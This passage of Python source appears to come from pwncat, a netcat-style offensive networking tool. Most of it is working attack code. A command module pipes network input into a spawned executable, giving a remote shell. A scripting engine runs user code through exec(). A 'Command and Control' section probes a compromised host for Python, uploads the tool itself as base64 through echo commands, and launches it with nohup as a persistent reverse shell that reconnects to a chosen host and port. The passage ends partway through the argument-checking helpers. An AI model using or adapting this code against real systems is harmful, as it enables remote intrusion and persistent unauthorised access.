            if self.__cli_opts.reconn &gt; 0:
                self.log.info(
                    &#34;Reconnecting to %s:%d in %.1f sec (%d more times left)&#34;,
                    self.__addr,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                    self.__cli_opts.reconn,
                )
            else:
                self.log.info(
                    &#34;Reconnecting to %s:%d in %.1f sec (indefinitely)&#34;,
                    self.__addr,
                    self.__ports[self.__pport],
                    self.__cli_opts.reconn_wait,
                )

            # [5/6] Decrease reconnect counter
            if self.__cli_opts.reconn &gt; 0:
                self.__cli_opts.reconn -= 1

            # [6/6] Recurse until True or reconnect count is used up
            if self.__net.run_client(self.__addr, self.__ports[self.__pport]):
                return True

        # [5/5] Signal failure
        self.log.info(&#34;Reconnect count is used up. Shutting down.&#34;)
        return False

    def __server_reaccept_from_client(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Ensure the server is able to keep connection open by re-accepting new clients.

        Returns:
            bool: True on success and False on failure
        &#34;&#34;&#34;
        # Do not re-accept for UDP
        assert not self.__sock_opts.udp, &#34;This should have been caught during arg check.&#34;
        assert self.__role == &#34;server&#34;, &#34;This should have been caught during arg check.&#34;

        # [NO] Do not re-accept
        if not self.__srv_opts.keep_open:
            self.log.info(&#34;No automatic re-accept specified. Shutting down.&#34;)
            return False

        # [MAYBE] Check stop signal and otherwise try until success.
        while True:
            time.sleep(0.1)
            # [NO] We have a stop signal
            if self.ssig.has_stop():
                return False
            # [YES] Re-accept indefinitely
            self.log.info(&#34;Re-accepting new clients&#34;)
            if self.__net.re_accept_client():
                return True


# -------------------------------------------------------------------------------------------------
# [5/10 IOStdinStdout]: (3/4) IOStdinStdout
# -------------------------------------------------------------------------------------------------
class IOStdinStdout(IO):
    &#34;&#34;&#34;Implement basic stdin/stdout I/O module.

    This I/O module provides a generator which continuously reads from stdin
    (non-blocking on POSIX and blocking on Windows) as well as a
    callback that writes to stdout.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, opts):
        # type: (StopSignal, DsIOStdinStdout) -&gt; None
        &#34;&#34;&#34;Set specific options for this I/O module.

        Args:
            ssig (StopSignal): StopSignal instance.
            opts (DsIOStdinStdout): IO options.
        &#34;&#34;&#34;
        super(IOStdinStdout, self).__init__(ssig)
        self.__opts = opts

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Constantly ask for user input.

        Yields:
            str: Data read from stdin.
        &#34;&#34;&#34;
        # https://stackoverflow.com/questions/1450393/#38670261
        # while True: line = sys.stdin.readline() &lt;- reads a whole line (faster)
        # for line in sys.stdin.readlin():        &lt;- reads one byte at a time
        while True:
            if self.ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged for reading STDIN-1&#34;)  # type: ignore
                return
            try:
                # TODO: select() does not work for windows on stdin/stdout
                if os.name != &#34;nt&#34;:
                    self.__set_input_timeout()
                line = sys.stdin.readline()
            except EOFError:
                # When using select() with timeout, we don&#39;t have any input
                # at this point and simply continue the loop or quit if
                # a terminate request has been made by other threads.
                if self.ssig.has_stop():
                    self.log.trace(&#34;Stop signal acknowledged for reading STDIN-2&#34;)  # type: ignore
                    return
                continue
            if line:
                self.log.debug(&#34;Received %d bytes from STDIN&#34;, len(line))
                self.log.trace(&#34;Received: %s&#34;, repr(line))  # type: ignore
                yield line
            # EOF or &lt;Ctrl&gt;+&lt;d&gt;
            else:
                # DO NOT RETURN HERE BLINDLY, THE UPSTREAM CONNECTION MUST GO FIRST!
                if self.ssig.has_stop():
                    self.log.trace(&#34;Stop signal acknowledged for reading STDIN-3&#34;)  # type: ignore
                    return

    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Print received data to stdout.&#34;&#34;&#34;
        # For issues with flush (when using tail -F or equal) see links below:
        # https://stackoverflow.com/questions/26692284
        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
        print(data, end=&#34;&#34;)
        try:
            sys.stdout.flush()
        except (BrokenPipeError, IOError):
            # Python flushes standard streams on exit; redirect remaining output
            # to devnull to avoid another BrokenPipeError at shutdown
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;[IOStdinStdout] interrupt() invoked&#34;
        )
        # Raise stop signal
        # TODO: Check if this is required???
        self.ssig.raise_stop()

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __set_input_timeout(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Throws a catchable EOFError exception for sys.stdin after timeout (Linux only).&#34;&#34;&#34;
        # rlist: wait until ready for reading
        # wlist: wait until ready for writing
        # xlist: wait for an exceptional condition
        if not select.select([sys.stdin], [], [], self.__opts.input_timeout)[0]:
            raise EOFError(&#34;timed out&#34;)


# -------------------------------------------------------------------------------------------------
# [5/10 IOCommand]: (4/4) IOCommand
# -------------------------------------------------------------------------------------------------
class IOCommand(IO):
    &#34;&#34;&#34;Implement command execution functionality.

    Attributes:
        proc (subprocess.Popen): subprocess.Popen instance.
    &#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, opts):
        # type: (StopSignal, DsIOCommand) -&gt; None
        &#34;&#34;&#34;Set specific options for this I/O module.

        Args:
            ssig (StopSignal): Instance of StopSignal.
            opts (DsIOCommand): Custom module options.
        &#34;&#34;&#34;
        super(IOCommand, self).__init__(ssig)
        self.__opts = opts
        self.log.debug(&#34;Setting &#39;%s&#39; as executable&#34;, self.__opts.executable)

        # Define destructor
        atexit.register(self.__destruct__)

        # Open executable to wait for commands
        env = os.environ.copy()
        try:
            self.proc = Popen(
                self.__opts.executable,
                stdin=PIPE,
                stdout=PIPE,
                stderr=STDOUT,
                bufsize=self.__opts.bufsize,
                shell=False,
                env=env,
            )
        except FileNotFoundError:
            self.log.error(&#34;Specified executable &#39;%s&#39; not found&#34;, self.__opts.executable)
            sys.exit(1)
        # Python-2 compat (doesn&#39;t have FileNotFoundError)
        except OSError:
            self.log.error(&#34;Specified executable &#39;%s&#39; not found&#34;, self.__opts.executable)
            sys.exit(1)

    def __destruct__(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Destructor.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;Killing executable: %s with pid %d&#34;, self.__opts.executable, self.proc.pid
        )
        self.proc.kill()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def producer(self):
        # type: () -&gt; Iterator[str]
        &#34;&#34;&#34;Constantly ask for input.

        Yields:
            str: Data received from command output.
        &#34;&#34;&#34;
        assert self.proc.stdout is not None
        while True:
            if self.ssig.has_stop():
                self.log.trace(&#34;Stop signal acknowledged in Command&#34;)  # type: ignore
                return
            self.log.trace(&#34;Reading command output&#34;)  # type: ignore
            data = self.proc.stdout.readline()  # Much better performance than self.proc.read(1)
            self.log.trace(&#34;Command output: %s&#34;, repr(data))  # type: ignore
            if not data:
                self.log.trace(&#34;Command output was empty. Exiting loop.&#34;)  # type: ignore
                break
            yield self.__opts.enc.decode(data)

    def consumer(self, data):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Send data received to stdin (command input).

        Args:
            data (str): Command to execute.
        &#34;&#34;&#34;
        assert self.proc.stdin is not None
        byte = self.__opts.enc.encode(data)
        self.log.trace(&#34;Appending to stdin: %s&#34;, repr(byte))  # type: ignore
        self.proc.stdin.write(byte)
        self.proc.stdin.flush()

    def interrupt(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Stop function that can be called externally to close this instance.&#34;&#34;&#34;
        self.log.trace(  # type: ignore
            &#34;[IOCommand] subprocess.kill() was raised by input_unterrupter()&#34;
        )
        self.proc.kill()
        # Raise stop signal
        # TODO: Check if this is required???
        self.ssig.raise_stop()


# #################################################################################################
# #################################################################################################
# ###
# ###   6 / 10   P S E   S T O R E
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [6/9 PSE]: (1/1) PSEStore
# -------------------------------------------------------------------------------------------------
class PSEStore(object):
    &#34;&#34;&#34;Pwncats Scripting Engine store to persist and exchange data for send/recv scripts.

    The same instance of this class will be available to your send and receive scripts
    that allow you to exchange data or manipulate themselves. You even have access to the
    currently used instance of the networking class to manipulate the active socket.
    As well as to the logger and StopSignal instances.
    &#34;&#34;&#34;

    @property
    def messages(self):
        # type: () -&gt; Dict[str, List[str]]
        &#34;&#34;&#34;`Dict[str, List[str]]`: Stores sent and received messages by its thread name.&#34;&#34;&#34;
        return self.__messages

    @messages.setter
    def messages(self, value):
        # type: (Dict[str, List[str]]) -&gt; None
        self.__messages = value

    @property
    def store(self):
        # type: () -&gt; Any
        &#34;&#34;&#34;`Any`: Custom data store to be used in PSE scripts to persist your data between calls.&#34;&#34;&#34;
        return self.__store

    @store.setter
    def store(self, value):
        # type: (Any) -&gt; None
        self.__store = value

    @property
    def ssig(self):
        # type: () -&gt; StopSignal
        &#34;&#34;&#34;`StopSignal`: Instance of Logging.logger class.&#34;&#34;&#34;
        return self.__ssig

    @property
    def net(self):
        # type: () -&gt; List[IONetwork]
        &#34;&#34;&#34;`IONetwork`: List of active IONetwork instances (client or server).&#34;&#34;&#34;
        return self.__net

    @property
    def log(self):
        # type: () -&gt; logging.Logger
        &#34;&#34;&#34;`Logging.logger`: Instance of Logging.logger class.&#34;&#34;&#34;
        return self.__log

    def __init__(self, ssig, net):
        # type: (StopSignal, List[IONetwork]) -&gt; None
        &#34;&#34;&#34;Instantiate the PSE class.

        Args:
            ssig (StopSignal): Instance of the StopSignal class to force a shutdown.
            net (IONetwork): Instance of the current network class to manipulate the socket.
        &#34;&#34;&#34;
        self.__messages = {}
        self.__store = None
        self.__ssig = ssig
        self.__net = net
        self.__log = logging.getLogger(__name__)


# #################################################################################################
# #################################################################################################
# ###
# ###   7 / 10   R U N N E R
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [7/10 IO RUNNER]: (1/1) Runner
# -------------------------------------------------------------------------------------------------
class Runner(object):
    &#34;&#34;&#34;Runner class that takes care about putting everything into threads.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, pse):
        # type: (PSEStore) -&gt; None
        &#34;&#34;&#34;Create a new Runner object.

        Args:
            pse (PSEStore): Pwncat Scripting Engine store.
        &#34;&#34;&#34;
        self.log = logging.getLogger(__name__)

        # Dict of producer/consumer action to run in a thread.
        # Each list item will be run in its own thread
        self.__actions = {}  # type: Dict[str, DsRunnerAction]

        # Dict of timed function definition to run in a thread.
        # Each list item will be run in its own thread.
        self.__timers = {}  # type: Dict[str, DsRunnerTimer]

        # A dict which holds the threads created from actions.
        # The name is based on the __actions name
        # {&#34;name&#34;: &#34;&lt;thread&gt;&#34;}
        self.__threads = {}  # type: Dict[str, threading.Thread]

        self.__pse = pse

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def add_action(self, name, action):
        # type: (str, DsRunnerAction) -&gt; None
        &#34;&#34;&#34;Add a function to the producer/consumer thread pool runner.

        Args:
            name (str): The name for the added action (will be used for logging the tread name).
            action (DsRunnerAction): Instance of DSRunnerAction.
        &#34;&#34;&#34;
        self.__actions[name] = action

    def add_timer(self, name, timer):
        # type: (str, DsRunnerTimer) -&gt; None
        &#34;&#34;&#34;Add a function to the timer thread pool runner.

        Args:
            name (str): The name for the added timer (will be used for logging the thread name).
            timer (DsRunnerTimer): Instance of DsRunnerTimer.
        &#34;&#34;&#34;
        self.__timers[name] = timer

    def run(self):
        # type: () -&gt; None
        &#34;&#34;&#34;Run threaded pwncat I/O modules.&#34;&#34;&#34;

        def run_action(
            name,  # type: str
            producer,  # type: Callable[[], str]
            consumer,  # type: Callable[[str], None]
            transformers,  # type: List[Transform]
            code,  # type: Optional[Union[str, bytes, CodeType]]
        ):
            # type: (...) -&gt; None
            &#34;&#34;&#34;Producer/consumer run function to be thrown into a thread.

            Args:
                name (str): Name for logging output.
                producer (function): A generator function which yields data.
                consumer (function): A callback which consumes data from the generator.
                transformers ([function]): List of transformer functions applied before consumer.
                code (ast.AST): User-supplied python code with a transform(data) -&gt; str function.
            &#34;&#34;&#34;
            self.log.trace(&#34;[%s] Producer Start&#34;, name)  # type: ignore
            for data in producer():
                self.log.trace(&#34;[%s] Producer received: %s&#34;, name, repr(data))  # type: ignore

                # [1/3] Transform data before sending it to the consumer
                for transformer in transformers:
                    data = transformer.transform(data)
                if transformers:
                    self.log.trace(  # type: ignore
                        &#34;[%s] Producer data after transformers: %s&#34;, name, repr(data)
                    )

                # [2/3] Apply custom user-supplied code transformations
                if code is not None:
                    self.log.debug(
                        &#34;[%s] Executing user supplied transform(data, pse) -&gt; data function&#34;, name
                    )
                    pse = self.__pse
                    # Add current message to PSE store
                    if name in self.__pse.messages:
                        self.__pse.messages[name] = self.__pse.messages[name] + [data]
                    else:
                        self.__pse.messages[name] = [data]
                    # Execute script code
                    exec(code, {}, locals())  # pylint: disable=exec-used
                    data = locals()[&#34;transform&#34;](data, pse)

                    self.log.trace(  # type: ignore
                        &#34;[%s] Producer data after user supplied transformer: %s&#34;, name, repr(data)
                    )

                # [3/3] Consume it
                consumer(data)
            self.log.trace(&#34;[%s] Producer Stop&#34;, name)  # type: ignore

        def run_timer(name, action, intvl, ssig, args, **kwargs):
            # type: (str, Callable[..., None], int, StopSignal, Any, Any) -&gt; None
            &#34;&#34;&#34;Timer run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called in a given intervall
                intvl (float):     Intervall at which the action function will be called
                ssig (StopSignal): Providing has_stop() and raise_stop()
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            &#34;&#34;&#34;
            self.log.trace(&#34;[%s] Timer Start (exec every %f sec)&#34;, name, intvl)  # type: ignore
            time_last = int(time.time())
            while True:
                if ssig.has_stop():
                    self.log.trace(&#34;Stop signal acknowledged for timer %s&#34;, name)  # type: ignore
                    return
                time_now = int(time.time())
                if time_now &gt; time_last + intvl:
                    self.log.debug(&#34;[%s] Executing timed function&#34;, time_now)
                    action(*args, **kwargs)
                    time_last = time_now  # Reset previous time
                time.sleep(0.1)

        # Start available action in a thread
        for key in self.__actions:
            # Create Thread object
            thread = threading.Thread(
                target=run_action,
                name=key,
                args=(
                    key,
                    self.__actions[key].producer,
                    self.__actions[key].consumer,
                    self.__actions[key].transformers,
                    self.__actions[key].code,
                ),
            )
            thread.daemon = False
            thread.start()
            self.__threads[key] = thread
        # Start available timers in a thread
        for key in self.__timers:
            # Create Thread object
            thread = threading.Thread(
                target=run_timer,
                name=key,
                args=(
                    key,
                    self.__timers[key].action,
                    self.__timers[key].intvl,
                    self.__timers[key].signal,
                    self.__timers[key].args,
                ),
                kwargs=self.__timers[key].kwargs,
            )
            thread.daemon = False
            thread.start()

        def check_stop(force):
            # type: (int) -&gt; bool
            &#34;&#34;&#34;Stop threads.&#34;&#34;&#34;
            for key in self.__threads:
                if not self.__threads[key].is_alive() or force:
                    # TODO: How are we gonna call the stop signal now?
                    #  # [1/3] Inform all threads (inside) about a stop signal.
                    #  # All threads with non-blocking funcs will be able to stop themselves
                    #  self.log.trace(  # type: ignore
                    #      &#34;Raise stop signal: StopSignal.stop() for thread [%s]&#34;,
                    #      self.__threads[key].getName(),
                    #  )
                    #  self.__actions[key].signal.raise_stop()
                    # [2/3] Call external interrupters
                    # These will shutdown all blocking functions inside a thread,
                    # so that they are actually able to join
                    for interrupt in self.__actions[key].interrupts:
                        self.log.trace(  # type: ignore
                            &#34;Call INTERRUPT: %s.%s() for %s&#34;,
                            getattr(interrupt, &#34;__self__&#34;).__class__.__name__,
                            interrupt.__name__,
                            self.__threads[key].getName(),
                        )
                        interrupt()
                    # [3/3] All blocking events inside the threads are gone, now join them
                    self.log.trace(&#34;Joining %s&#34;, self.__threads[key].getName())  # type: ignore
                    self.__threads[key].join(timeout=0.1)
            # If all threads have died or force is requested, then exit
            if not all([self.__threads[key].is_alive() for key in self.__threads]) or force:
                return True
            return False

        try:
            while True:
                if check_stop(False):
                    sys.exit(0)
                # Need a timeout to not skyrocket the CPU
                time.sleep(0.1)
        except KeyboardInterrupt:
            print()
            check_stop(True)
            sys.exit(1)


# #################################################################################################
# #################################################################################################
# ###
# ###   8 / 10   C O M M A N D   A N D   C O N T R O L   M O D U L E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [8/10 Command &amp; Control]: (1/2) CNC
# -------------------------------------------------------------------------------------------------
class CNC(object):
    &#34;&#34;&#34;Command and Control base class.&#34;&#34;&#34;

    __PYTHON_PATHS = [
        &#34;/bin&#34;,
        &#34;/usr/bin&#34;,
        &#34;/usr/local/bin&#34;,
        &#34;/usr/local/python/bin&#34;,
        &#34;/usr/local/python2/bin&#34;,
        &#34;/usr/local/python2.7/bin&#34;,
        &#34;/usr/local/python3/bin&#34;,
        &#34;/usr/local/python3.5/bin&#34;,
        &#34;/usr/local/python3.6/bin&#34;,
        &#34;/usr/local/python3.7/bin&#34;,
        &#34;/usr/local/python3.8/bin&#34;,
        &#34;/opt/bin&#34;,
        &#34;/opt/python/bin&#34;,
        &#34;/opt/python2/bin&#34;,
        &#34;/opt/python2.7/bin&#34;,
        &#34;/opt/python3/bin&#34;,
        &#34;/opt/python3.5/bin&#34;,
        &#34;/opt/python3.6/bin&#34;,
        &#34;/opt/python3.7/bin&#34;,
        &#34;/opt/python3.8/bin&#34;,
    ]

    __PYTHON_VERSIONS = [
        &#34;python&#34;,
        &#34;python2&#34;,
        &#34;python2.7&#34;,
        &#34;python3&#34;,
        &#34;python3.5&#34;,
        &#34;python3.6&#34;,
        &#34;python3.7&#34;,
        &#34;python3.8&#34;,
    ]

    __COLORS = {&#34;yellow&#34;: &#34;\x1b[33;21m&#34;, &#34;reset&#34;: &#34;\x1b[0m&#34;}

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def python(self):
        # type: () -&gt; str
        &#34;&#34;&#34;Discovered absolute Python remote path.&#34;&#34;&#34;
        return self.__python

    @property
    def py3(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Is remote version Python3? Else it is Python2.&#34;&#34;&#34;
        return self.__py3

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, enc, fsend, frecv):
        # type: (StringEncoder, Callable[[str], None], Callable[[], Iterator[str]]) -&gt; None
        &#34;&#34;&#34;Instantiate Command and Control class.

        Args:
            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            fsend (func): Socket send function.
            frcev (func): Socket receive generator function.

        Raises:
            FileNotFoundError: if remote Python binary path is not found.
        &#34;&#34;&#34;
        self.__enc = enc
        self.__fsend = fsend
        self.__frecv = frecv

        if not self.__set_remote_python_path():
            self.print_info(&#34;No Python has been found. Aborting and handing over to current shell.&#34;)
            raise FileNotFoundError()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def print_info(self, message=None, newline=True, erase=False):
        # type: (Optional[str], bool, bool) -&gt; None
        &#34;&#34;&#34;Print a message to the local screen to inform the user.

        Args:
            message (str): The message to print.
            newline (bool): Add a newline?
            erase (bool): Erase previously printed text on the same line.
        &#34;&#34;&#34;
        end = &#34;\n&#34; if newline else &#34;&#34;
        prefix = &#34;{}[PWNCAT CnC]{} &#34;.format(self.__COLORS[&#34;yellow&#34;], self.__COLORS[&#34;reset&#34;])
        if message is None:
            message = &#34;&#34;
            prefix = &#34;&#34;

        if erase:
            print(&#34;\r&#34; * 1024 + &#34;{}{}&#34;.format(prefix, message), end=end)
            sys.stdout.flush()
        else:
            print(&#34;{}{}&#34;.format(prefix, message), end=end)
            sys.stdout.flush()

    def remote_command(self, command):
        # type: (str) -&gt; None
        &#34;&#34;&#34;Run remote command with correct linefeeds.

        Args:
            command (str): The command to execute on the remote end.
        &#34;&#34;&#34;
        # TODO: determine remote host line feeds and set accordingly.
        self.__fsend(command + &#34;\n&#34;)

    def create_remote_tmpfile(self):
        # type: () -&gt; Optional[str]
        &#34;&#34;&#34;OS-independent remote tempfile creation.

        Returns:
            str or None: Returns path on success or None on error.
        &#34;&#34;&#34;
        command = []
        command.append(&#34;{} -c &#39;&#34;.format(self.__python))
        command.append(&#34;import tempfile;&#34;)
        command.append(&#34;h,f=tempfile.mkstemp();&#34;)
        if self.__py3:
            command.append(&#34;print(f);&#34;)
        else:
            command.append(&#34;print f;&#34;)
        command.append(&#34;&#39;&#34;)
        self.remote_command(&#34;&#34;.join(command))

        self.print_info(&#34;Creating tmpfile:&#34;, False, True)
        for response in self.__frecv():
            if response:
                tmpfile = response.rstrip()
                self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
                return tmpfile

        self.print_info(&#34;Failed to create tmpfile&#34;, True, True)
        return None

    def upload(self, lpath, rpath):
        # type: (str, str) -&gt; bool
        &#34;&#34;&#34;OS-independent upload of a local file to a remote path.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        assert self.__python is not None
        assert self.__py3 is not None

        rpath_b64 = self.create_remote_tmpfile()
        if rpath_b64 is None:
            return False
        if not self.__upload_file_base_64_encoded(lpath, rpath_b64):
            return False
        if not self.__remote_base64_decode(rpath_b64, rpath):
            return False
        return True

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __set_remote_python_path(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;Enumerate remote Python binary.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        # TODO: Make windows compatible
        for path in self.__PYTHON_PATHS:
            for version in self.__PYTHON_VERSIONS:
                python = path + &#34;/&#34; + version
                self.print_info(&#34;Probing for: {}&#34;.format(python))
                self.remote_command(&#34;test -f {p} &amp;&amp; echo {p} || echo;&#34;.format(p=python))
                for response in self.__frecv():
                    reg = re.search(r&#34;^([.0-9]+)&#34;, response)
                    if response.rstrip() == python.rstrip():
                        self.print_info(&#34;Potential path: {}&#34;.format(python))
                        command = []
                        command.append(&#34;{} -c &#39;&#34;.format(python))
                        command.append(&#34;from __future__ import print_function;&#34;)
                        command.append(&#34;import sys;&#34;)
                        command.append(&#34;v=sys.version_info;&#34;)
                        command.append(&#39;print(&#34;{}.{}.{}&#34;.format(v[0], v[1], v[2]));\&#39;&#39;)
                        data = &#34;&#34;.join(command)
                        self.remote_command(data)
                        continue
                    if reg:
                        match = reg.group(1)
                        if match[0] == &#34;2&#34;:
                            self.__py3 = False
                        elif match[0] == &#34;3&#34;:
                            self.__py3 = True
                        else:
                            self.print_info(
                                &#34;Could not determine major version: {}&#34;.format(reg.group(1))
                            )
                            return False
                        self.print_info(&#34;Found valid Python{} version: {}&#34;.format(match[0], match))
                        self.__python = python
                        return True
                    # Nothing matched, break the innter loop
                    break
        return False

    def __upload_file_base_64_encoded(self, lpath, rpath):
        # type: (str, str) -&gt; bool
        &#34;&#34;&#34;Upload a local file to a base64 encoded remote file.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        &#34;&#34;&#34;
        first = True
        with open(lpath, &#34;r&#34;) as fhandle:
            lines = fhandle.readlines()
            count = len(lines)
            curr = 1
            for line in lines:
                self.print_info(
                    &#34;Uploading: {} -&gt; {} ({}/{})&#34;.format(lpath, rpath, curr, count), False, True
                )
                b64 = self.__enc.base64_encode(line)
                if first:
                    self.remote_command(&#39;echo &#34;{}&#34; &gt; {}&#39;.format(b64, rpath))
                    first = False
                else:
                    self.remote_command(&#39;echo &#34;{}&#34; &gt;&gt; {}&#39;.format(b64, rpath))
                curr += 1
        self.print_info()
        # TODO: md5 check if this is legit
        return True

    def __remote_base64_decode(self, rpath_source, rpath_target):
        # type: (str, str) -&gt; bool
        &#34;&#34;&#34;Decode a remote base64 encoded file with pure Python.

        Args:
            rpath_source (str): The remote path to the existing base64 encoded file.
            rpath_target (str): The remote path to the desired base64 decoded file.

        Returns:
            bool: Returns `True` on success or `False` on failure.
        &#34;&#34;&#34;
        command = []
        command.append(&#34;{} -c &#39;import base64;&#34;.format(self.__python))
        command.append(&#39;f=open(&#34;{}&#34;, &#34;r&#34;);&#39;.format(rpath_source))
        command.append(&#34;lines = f.readlines();&#34;)
        if self.__py3:
            command.append(&#39;print(&#34;&#34;.join([base64.b64decode(l.encode()) for l in lines]));\&#39;&#39;)
        else:
            command.append(&#39;print &#34;&#34;.join([base64.b64decode(l) for l in lines]);\&#39;&#39;)
        command.append(&#34;&gt; {}&#34;.format(rpath_target))

        self.print_info(&#34;Decoding: {} -&gt; {}&#34;.format(rpath_source, rpath_target))
        self.remote_command(&#34;&#34;.join(command))
        # TODO: validate via md5
        return True


# -------------------------------------------------------------------------------------------------
# [8/10 Command &amp; Control]: (1/2) CNCAutoDeploy
# -------------------------------------------------------------------------------------------------
class CNCAutoDeploy(CNC):
    &#34;&#34;&#34;Command&amp;Control pwncat auto deployment class.&#34;&#34;&#34;

    def __init__(
        self,
        enc,  # type: StringEncoder
        send,  # type: Callable[[str], None]
        recv,  # type: Callable[[], Iterator[str]]
        cmd,  # type: str
        host,  # type: str
        port,  # type: str
    ):
        # type: (...) -&gt; None
        try:
            super(CNCAutoDeploy, self).__init__(enc, send, recv)
        except FileNotFoundError:
            return

        local_path = os.path.abspath(__file__)
        remote_path = self.create_remote_tmpfile()
        if remote_path is None:
            return
        if not self.upload(local_path, remote_path):
            return
        # TODO: Ensure pwncat stays running
        self.__start_pwncat(remote_path, cmd, host, port)
        return

    def __start_pwncat(self, remote_path, binary, host, port):
        # type: (str, str, str, str) -&gt; None
        command = []
        command.append(&#34;nohup&#34;)
        command.append(self.python)
        command.append(remote_path)
        command.append(&#34;--exec {}&#34;.format(binary))
        command.append(&#34;--reconn&#34;)
        command.append(&#34;--reconn-wait 1&#34;)
        command.append(host)
        command.append(port)
        command.append(&#34;&amp;&#34;)
        data = &#34; &#34;.join(command)
        print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
        self.remote_command(data)


# #################################################################################################
# #################################################################################################
# ###
# ###   9 / 10   C O M M A N D   L I N E   A R G U M E N T S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [9/10 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions
# -------------------------------------------------------------------------------------------------
def get_version():
    # type: () -&gt; str
    &#34;&#34;&#34;Return version information.&#34;&#34;&#34;
    return &#34;&#34;&#34;%(prog)s: Version %(version)s (%(url)s) by %(author)s&#34;&#34;&#34; % (
        {&#34;prog&#34;: APPNAME, &#34;version&#34;: VERSION, &#34;url&#34;: APPREPO, &#34;author&#34;: &#34;cytopia&#34;}
    )


def _args_check_lf(value):
    # type: (Optional[str]) -&gt; Optional[str]
    &#34;&#34;&#34;Evaluate a yes/no choice into True, False or None.&#34;&#34;&#34;
    if value is None:
        return None
    if value.lower() in [&#34;crlf&#34;, &#34;lf&#34;, &#34;cr&#34;, &#34;no&#34;]:
        return value.lower()
    raise argparse.ArgumentTypeError(&#34;&#39;%s&#39; is an invalid choice&#34; % value)


def _args_check_tos(value):
    # type: (str) -&gt; str
    if value not in [&#34;mincost&#34;, &#34;lowcost&#34;, &#34;reliability&#34;, &#34;throughput&#34;, &#34;lowdelay&#34;]:
        raise argparse.ArgumentTypeError(&#34;%s is an invalid tos definition&#34; % value)
    return value


def _args_check_info(value):
    # type: (str) -&gt; str
    if value not in [&#34;sock&#34;, &#34;ipv4&#34;, &#34;ipv6&#34;, &#34;tcp&#34;, &#34;all&#34;, &#34;&#34;]:
        raise argparse.ArgumentTypeError(&#34;%s is an invalid info definition&#34; % value)
    return value


def _args_check_color(value):
    # type: (str) -&gt; str
    if value not in [&#34;auto&#34;, &#34;always&#34;, &#34;never&#34;]:
        raise argparse.ArgumentTypeError(&#34;%s is an invalid color definition&#34; % value)
    return value


def _args_check_upload_myself(value):
    # type: (str) -&gt; str
    opts = value.split(&#34;:&#34;)
    if len(opts) != 3:
        raise argparse.ArgumentTypeError(&#34;%s is an invalid cmd[:host]:port definition&#34; % value)
    _args_check_port(opts[-1])
    return value


def _args_check_script(value):
    # type: (str) -&gt; str
    if not os.path.isfile(value):
        raise argparse.ArgumentTypeError(&#34;File not found: %s&#34; % value)

    fhandle = open(value, mode=&#34;r&#34;)
    script = fhandle.read()
    fhandle.close()
    return script


def _args_check_port(value):
    # type: (str) -&gt; int
    &#34;&#34;&#34;Check arguments for invalid port number.&#34;&#34;&#34;
    min_port = 1
    max_port = 65535
    intvalue = int(value)

    if intvalue &lt; min_port or intvalue &gt; max_port:
        raise argparse.ArgumentTypeError(&#34;%s is an invalid port number&#34; % value)
    return intvalue


def _args_check_forwards(value):
    # type: (str) -&gt; str
    &#34;&#34;&#34;Check forward argument (-L/-R) for correct pattern.&#34;&#34;&#34;
    match = re.search(r&#34;(.+):(.+)&#34;, value)
    if match is None or len(match.groups()) != 2:
        raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;addr:port&#39; format.&#34; % value)
    _args_check_port(match.group(2))
    return value


def _args_check_robin_ports(value):
    # type: (str) -&gt; List[int]
    &#34;&#34;&#34;Check round-robin argument for comma separated string or range.&#34;&#34;&#34;
